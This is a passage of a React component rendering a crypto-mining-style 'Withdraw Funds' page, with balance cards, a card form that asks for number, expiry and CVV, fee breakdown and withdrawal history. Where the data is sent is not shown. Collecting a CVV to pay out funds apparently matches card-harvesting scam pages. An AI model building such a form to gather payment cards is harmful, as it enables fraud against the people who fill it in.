              <h1 style={{ fontSize:isMobile?18:22,fontFamily:"'Syne',sans-serif",fontWeight:800,letterSpacing:-0.5 }}>WITHDRAW <span style={{ color:"#2a2a2a",fontSize:isMobile?13:16,fontWeight:400 }}>/ Funds</span></h1>
            </div>
          </div>
        </header>

        {/* BALANCE CARDS */}
        <div style={{ display:"grid",gridTemplateColumns:isMobile?"1fr 1fr":"repeat(4,1fr)",gap:10,marginBottom:20,animation:"fadeIn 0.5s ease 0.1s both" }}>
          {[
            {label:"Available", value:fmtBig(balance),         sub:canWithdraw?"✓ Ready":`$${fmtBig(MIN_WITHDRAWAL-balance)} more`, color:canWithdraw?"#00c896":"#e31937", accent:canWithdraw?"rgba(0,200,150,0.07)":"rgba(227,25,55,0.07)"},
            {label:"Withdrawn", value:fmtBig(totalWithdrawn),  sub:`${withdrawals.filter(w=>w.status==="Completed").length} done`,   color:"#6366f1", accent:"rgba(99,102,241,0.07)"},
            {label:"Pending",   value:String(pendingCount),    sub:pendingCount>0?"In progress":"All clear",                          color:pendingCount>0?"#f59e0b":"#444", accent:"rgba(255,255,255,0.02)"},
            {label:"Min.",      value:`$${MIN_WITHDRAWAL.toLocaleString()}`, sub:canWithdraw?"Met ✓":"Keep mining",                   color:"#888", accent:"rgba(255,255,255,0.02)"},
          ].map(({label,value,sub,color,accent})=>(
            <div key={label} style={{ ...card,padding:isMobile?"10px 12px":"12px 14px",background:accent }}>
              <div style={{ fontSize:8,color:"#444",letterSpacing:1,textTransform:"uppercase",marginBottom:4 }}>{label}</div>
              <div style={{ fontSize:isMobile?14:20,fontWeight:800,color,lineHeight:1,marginBottom:3,fontFamily:"'Syne',sans-serif",whiteSpace:"nowrap" }}>{value}</div>
              <div style={{ fontSize:9,color:"#444",whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis" }}>{sub}</div>
            </div>
          ))}
        </div>

        {/* TABS */}
        <div style={{ display:"flex",gap:8,marginBottom:22 }}>
          {["withdraw","history"].map(t=>(
            <button key={t} onClick={()=>setActiveTab(t)} style={{ padding:"9px 20px",borderRadius:10,fontSize:12,fontWeight:600,fontFamily:"'JetBrains Mono',monospace",transition:"all 0.2s",background:activeTab===t?"rgba(227,25,55,0.12)":"rgba(255,255,255,0.03)",border:`1px solid ${activeTab===t?"rgba(227,25,55,0.3)":"rgba(255,255,255,0.06)"}`,color:activeTab===t?"#e31937":"#444" }}>
              {t==="withdraw"?"💸 Withdraw":`📋 History (${withdrawals.length})`}
            </button>
          ))}
        </div>

        {/* ══ WITHDRAW TAB ══ */}
        {activeTab==="withdraw"&&(
          <div style={{ animation:"fadeIn 0.4s ease" }}>
            {!canWithdraw?<LockedScreen balance={balance}/>:(
              <div style={{ display:"grid",gridTemplateColumns:isMobile?"1fr":"1fr 340px",gap:20 }}>

                {/* FORM */}
                <div style={{ ...card,padding:isMobile?20:28 }}>
                  <div style={{ fontSize:10,color:"#444",letterSpacing:2,textTransform:"uppercase",marginBottom:20 }}>Card Payment Details</div>

                  {/* Unlocked banner */}
                  <div style={{ background:"rgba(0,200,150,0.07)",border:"1px solid rgba(0,200,150,0.2)",borderRadius:12,padding:"12px 16px",marginBottom:22,display:"flex",gap:10,alignItems:"center" }}>
                    <span style={{ fontSize:18 }}>🎉</span>
                    <div>
                      <div style={{ fontSize:12,color:"#00c896",fontWeight:700,marginBottom:2 }}>Withdrawal Unlocked!</div>
                      <div style={{ fontSize:11,color:"#006644" }}>Your balance has reached ${MIN_WITHDRAWAL.toLocaleString()}. Enter your card details to withdraw.</div>
                    </div>
                  </div>

                  {/* Live card preview */}
                  <CardPreview cardType={selectedCardType} cardNumber={cardNumber} expiry={expiry} cardName={cardName}/>

                  {/* Card type */}
                  <div style={{ marginBottom:20 }}>
                    <label style={{ fontSize:11,color:"#444",letterSpacing:1.5,textTransform:"uppercase",display:"block",marginBottom:10 }}>Card Type</label>
                    <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:8 }}>
                      {CARD_TYPES.map(ct=>(
                        <button key={ct.id} onClick={()=>setSelectedCardType(ct.id)} style={{ padding:"11px 14px",borderRadius:12,display:"flex",alignItems:"center",gap:9, background:selectedCardType===ct.id?"rgba(255,255,255,0.07)":"rgba(255,255,255,0.03)", border:`1.5px solid ${selectedCardType===ct.id?"rgba(255,255,255,0.2)":"rgba(255,255,255,0.06)"}`,transition:"all 0.2s",cursor:"pointer" }}>
                          <div style={{ width:10,height:10,borderRadius:"50%",background:ct.color,flexShrink:0,boxShadow:selectedCardType===ct.id?`0 0 8px ${ct.color}88`:"none" }}/>
                          <span style={{ fontSize:12,fontWeight:700,color:selectedCardType===ct.id?"#fff":"#555" }}>{ct.label}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Card holder name */}
                  <div style={{ marginBottom:16 }}>
                    <label style={{ fontSize:11,color:errors.cardName?"#ff4455":"#444",letterSpacing:1.5,textTransform:"uppercase",display:"block",marginBottom:8 }}>Card Holder Name</label>
                    <input value={cardName} onChange={e=>{setCardName(e.target.value.toUpperCase());setErrors(er=>({...er,cardName:""}));}} placeholder="JOHN DOE" style={{ width:"100%",padding:"13px 16px",borderRadius:12,background:"rgba(255,255,255,0.03)",border:`1px solid ${errors.cardName?"#ff4455":"rgba(255,255,255,0.08)"}`,color:"#fff",fontSize:13,fontFamily:"'JetBrains Mono',monospace" }}/>
                    {errors.cardName&&<div style={{ fontSize:11,color:"#ff4455",marginTop:5 }}>⚠ {errors.cardName}</div>}
                  </div>

                  {/* Card number */}
                  <div style={{ marginBottom:16 }}>
                    <label style={{ fontSize:11,color:errors.cardNumber?"#ff4455":"#444",letterSpacing:1.5,textTransform:"uppercase",display:"block",marginBottom:8 }}>Card Number</label>
                    <input value={cardNumber} onChange={e=>{setCardNumber(fmtCardNumber(e.target.value));setErrors(er=>({...er,cardNumber:""}));}} placeholder="0000 0000 0000 0000" maxLength={19} style={{ width:"100%",padding:"13px 16px",borderRadius:12,background:"rgba(255,255,255,0.03)",border:`1px solid ${errors.cardNumber?"#ff4455":"rgba(255,255,255,0.08)"}`,color:"#fff",fontSize:14,fontFamily:"'JetBrains Mono',monospace",letterSpacing:2 }}/>
                    {errors.cardNumber&&<div style={{ fontSize:11,color:"#ff4455",marginTop:5 }}>⚠ {errors.cardNumber}</div>}
                  </div>

                  {/* Expiry + CVV */}
                  <div style={{ display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:20 }}>
                    <div>
                      <label style={{ fontSize:11,color:errors.expiry?"#ff4455":"#444",letterSpacing:1.5,textTransform:"uppercase",display:"block",marginBottom:8 }}>Expiry Date</label>
                      <input value={expiry} onChange={e=>{setExpiry(fmtExpiry(e.target.value));setErrors(er=>({...er,expiry:""}));}} placeholder="MM/YY" maxLength={5} style={{ width:"100%",padding:"13px 16px",borderRadius:12,background:"rgba(255,255,255,0.03)",border:`1px solid ${errors.expiry?"#ff4455":"rgba(255,255,255,0.08)"}`,color:"#fff",fontSize:14,fontFamily:"'JetBrains Mono',monospace",letterSpacing:2 }}/>
                      {errors.expiry&&<div style={{ fontSize:11,color:"#ff4455",marginTop:5 }}>⚠ {errors.expiry}</div>}
                    </div>
                    <div>
                      <label style={{ fontSize:11,color:errors.cvv?"#ff4455":"#444",letterSpacing:1.5,textTransform:"uppercase",display:"block",marginBottom:8 }}>CVV / CVC</label>
                      <input value={cvv} onChange={e=>{setCvv(e.target.value.replace(/\D/g,"").slice(0,4));setErrors(er=>({...er,cvv:""}));}} placeholder="•••" maxLength={4} type="password" style={{ width:"100%",padding:"13px 16px",borderRadius:12,background:"rgba(255,255,255,0.03)",border:`1px solid ${errors.cvv?"#ff4455":"rgba(255,255,255,0.08)"}`,color:"#fff",fontSize:14,fontFamily:"'JetBrains Mono',monospace" }}/>
                      {errors.cvv&&<div style={{ fontSize:11,color:"#ff4455",marginTop:5 }}>⚠ {errors.cvv}</div>}
                    </div>
                  </div>

                  {/* Amount */}
                  <div style={{ marginBottom:20 }}>
                    <div style={{ display:"flex",justifyContent:"space-between",marginBottom:8 }}>
                      <label style={{ fontSize:11,color:"#444",letterSpacing:1.5,textTransform:"uppercase" }}>Amount (USD)</label>
                      <button onClick={()=>setAmount(balance.toFixed(2))} style={{ fontSize:10,color:"#e31937",background:"none",padding:"2px 8px",borderRadius:6,border:"1px solid rgba(227,25,55,0.25)",cursor:"pointer" }}>MAX</button>
                    </div>
                    <div style={{ position:"relative" }}>
                      <span style={{ position:"absolute",left:14,top:"50%",transform:"translateY(-50%)",color:"#444",fontSize:15 }}>$</span>
                      <input type="number" value={amount} onChange={e=>{setAmount(e.target.value);setErrors(er=>({...er,amount:""}));}} placeholder="0.00" min={MIN_WITHDRAWAL} max={balance} style={{ width:"100%",padding:"13px 16px 13px 28px",borderRadius:12,background:"rgba(255,255,255,0.03)",border:`1px solid ${errors.amount?"#ff4455":"rgba(255,255,255,0.08)"}`,color:"#fff",fontSize:15,fontFamily:"'JetBrains Mono',monospace" }}/>
                    </div>
                    {errors.amount&&<div style={{ fontSize:11,color:"#ff4455",marginTop:5 }}>⚠ {errors.amount}</div>}
                  </div>

                  {/* Fee breakdown */}
                  {parsedAmount>0&&(
                    <div style={{ background:"rgba(255,255,255,0.02)",border:"1px solid rgba(255,255,255,0.05)",borderRadius:12,padding:"14px 16px",marginBottom:22 }}>
                      {[{label:"Withdrawal Amount",value:fmtBig(parsedAmount),color:"#ccc"},{label:"Processing Fee (1.5%)",value:`-${fmtBig(fee)}`,color:"#ff6b6b"},{label:"You Receive",value:fmtBig(receive),color:"#00c896",bold:true}].map(({label,value,color,bold})=>(
                        <div key={label} style={{ display:"flex",justifyContent:"space-between",padding:"6px 0",borderBottom:label!=="You Receive"?"1px solid rgba(255,255,255,0.04)":"none" }}>
                          <span style={{ fontSize:12,color:"#444" }}>{label}</span>
                          <span style={{ fontSize:13,color,fontWeight:bold?700:500 }}>{value}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  <button onClick={handleSubmit} style={{ width:"100%",padding:"15px 0",borderRadius:12,background:"linear-gradient(135deg,#aa0000,#e31937)",color:"#fff",fontWeight:700,fontSize:14,fontFamily:"'JetBrains Mono',monospace",letterSpacing:0.5,boxShadow:"0 4px 20px rgba(227,25,55,0.35)",cursor:"pointer",transition:"all 0.2s",border:"none" }} onMouseEnter={e=>e.currentTarget.style.transform="translateY(-2px)"} onMouseLeave={e=>e.currentTarget.style.transform="translateY(0)"}>
                    → Request Withdrawal
                  </button>
                </div>

                {/* RIGHT PANEL */}
                <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
                  <div style={{ background:"rgba(99,102,241,0.07)",border:"1px solid rgba(99,102,241,0.18)",borderRadius:14,padding:"16px 18px" }}>
                    <div style={{ display:"flex",alignItems:"center",gap:8,marginBottom:10 }}><span style={{ fontSize:15 }}>🛡️</span><span style={{ fontSize:10,color:"#6366f1",letterSpacing:2,textTransform:"uppercase",fontWeight:700 }}>Security Notice</span></div>
                    {["Your card details are transmitted securely","We process payments within 24 hours","Double-check all details before confirming",`Minimum withdrawal: $${MIN_WITHDRAWAL.toLocaleString()}`].map((t,i)=>(
                      <div key={i} style={{ display:"flex",gap:8,marginBottom:6 }}><span style={{ color:"#6366f1",fontSize:10,marginTop:1,flexShrink:0 }}>›</span><span style={{ fontSize:11,color:"#555",lineHeight:1.5 }}>{t}</span></div>
                    ))}
                  </div>
                  <div style={{ ...card,padding:"16px 18px" }}>
                    <div style={{ fontSize:10,color:"#444",letterSpacing:2,textTransform:"uppercase",marginBottom:14 }}>Accepted Cards</div>
                    {CARD_TYPES.map(ct=>(
                      <div key={ct.id} style={{ display:"flex",alignItems:"center",gap:12,padding:"8px 0",borderBottom:"1px solid rgba(255,255,255,0.04)" }}>
                        <div style={{ width:32,height:22,borderRadius:4,background:ct.gradient,flexShrink:0,display:"flex",alignItems:"center",justifyContent:"center" }}><div style={{ width:8,height:8,borderRadius:"50%",background:"rgba(255,255,255,0.8)" }}/></div>
                        <span style={{ fontSize:12,fontWeight:700,color:selectedCardType===ct.id?"#fff":"#555",flex:1 }}>{ct.label}</span>
                        {selectedCardType===ct.id&&<span style={{ fontSize:9,color:"#00c896",background:"rgba(0,200,150,0.12)",padding:"2px 7px",borderRadius:10,border:"1px solid rgba(0,200,150,0.2)" }}>SELECTED</span>}
                      </div>
                    ))}
                  </div>
                  <div style={{ ...card,padding:"16px 18px" }}>
                    <div style={{ fontSize:10,color:"#444",letterSpacing:2,textTransform:"uppercase",marginBottom:12 }}>Your Stats</div>
                    {[{label:"Total Requests",value:withdrawals.length},{label:"Completed",value:withdrawals.filter(w=>w.status==="Completed").length},{label:"Pending",value:pendingCount},{label:"Total Withdrawn",value:fmtBig(totalWithdrawn)}].map(({label,value})=>(
                      <div key={label} style={{ display:"flex",justifyContent:"space-between",padding:"7px 0",borderBottom:"1px solid rgba(255,255,255,0.04)" }}>
                        <span style={{ fontSize:11,color:"#444" }}>{label}</span>
                        <span style={{ fontSize:13,color:"#ccc",fontWeight:600 }}>{value}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* ══ HISTORY TAB ══ */}
        {activeTab==="history"&&(
          <div style={{ animation:"fadeIn 0.4s ease" }}>
            {withdrawals.length===0?(
              <div style={{ ...card,padding:52,textAlign:"center" }}>
                <div style={{ fontSize:44,marginBottom:14 }}>📭</div>
                <div style={{ fontSize:16,color:"#444",marginBottom:6 }}>No withdrawals yet</div>
                <div style={{ fontSize:12,color:"#2a2a2a" }}>Your withdrawal history will appear here once you make your first request.</div>
              </div>
            ):(
              <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
                {withdrawals.map(w=>(
                  <div key={w.id} style={{ ...card,padding:isMobile?18:"22px 26px",position:"relative",overflow:"hidden" }}>
                    <div style={{ position:"absolute",top:0,left:0,right:0,height:2,background:w.status==="Completed"?"linear-gradient(90deg,transparent,#00c896,transparent)":w.status==="Failed"?"linear-gradient(90deg,transparent,#ff4455,transparent)":"linear-gradient(90deg,transparent,#e31937,transparent)",opacity:0.5 }}/>
                    <div style={{ display:"flex",justifyContent:"space-between",alignItems:"flex-start",marginBottom:18,flexWrap:"wrap",gap:10 }}>
                      <div>
                        <div style={{ display:"flex",alignItems:"center",gap:8,marginBottom:5 }}>
                          <span style={{ fontSize:15,fontWeight:800,color:"#fff",fontFamily:"'Syne',sans-serif" }}>{fmtBig(w.amount)}</span>
                          <span style={{ fontSize:11,color:"#333" }}>→</span>
                          <span style={{ fontSize:15,fontWeight:800,color:"#00c896",fontFamily:"'Syne',sans-serif" }}>{fmtBig(w.receive)}</span>
                          <span style={{ fontSize:10,color:"#333" }}>received</span>
                        </div>
                        <div style={{ fontSize:11,color:"#444" }}>{tsToDate(w.timestamp)} · {tsToTime(w.timestamp)} · {w.cardTypeLabel} · {maskCard(w.cardNumber?.replace(/\s/g,"")||"")}</div>
                      </div>
                      <div style={{ display:"flex",flexDirection:"column",alignItems:"flex-end",gap:6 }}>
                        <StatusBadge status={w.status}/>
                        <span style={{ fontSize:10,color:"#2a2a2a" }}>{w.id}</span>
                      </div>
                    </div>
                    {w.status!=="Failed"&&<StatusTracker status={w.status}/>}
                    {w.pendingUntil&&w.status!=="Completed"&&w.status!=="Failed"&&(
                      <div style={{ background:"rgba(245,158,11,0.07)",border:"1px solid rgba(245,158,11,0.2)",borderRadius:10,padding:"10px 14px",marginTop:10,display:"flex",gap:10,alignItems:"center" }}>
                        <span style={{ fontSize:14 }}>⏳</span>
                        <div>
                          <div style={{ fontSize:11,color:"#f59e0b",fontWeight:700,marginBottom:2 }}>Withdrawal Pending</div>
                          <div style={{ fontSize:11,color:"#6b5010",lineHeight:1.5 }}>Your card payment is being verified. Funds will be sent within <strong style={{ color:"#f59e0b" }}>24 hours</strong>.</div>
                        </div>
                      </div>
                    )}
                    <div style={{ display:"flex",gap:isMobile?14:28,flexWrap:"wrap",marginTop:10,paddingTop:12,borderTop:"1px solid rgba(255,255,255,0.04)" }}>
                      {[{label:"Gross Amount",value:fmtBig(w.amount),color:"#ccc"},{label:"Fee Paid",value:fmtBig(w.fee),color:"#ff6b6b"},{label:"Net Received",value:fmtBig(w.receive),color:"#00c896"},{label:"Card Type",value:w.cardTypeLabel,color:"#888"}].map(({label,value,color})=>(
                        <div key={label}>
                          <div style={{ fontSize:9,color:"#333",textTransform:"uppercase",letterSpacing:1,marginBottom:3 }}>{label}</div>
                          <div style={{ fontSize:13,fontWeight:700,color }}>{value}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}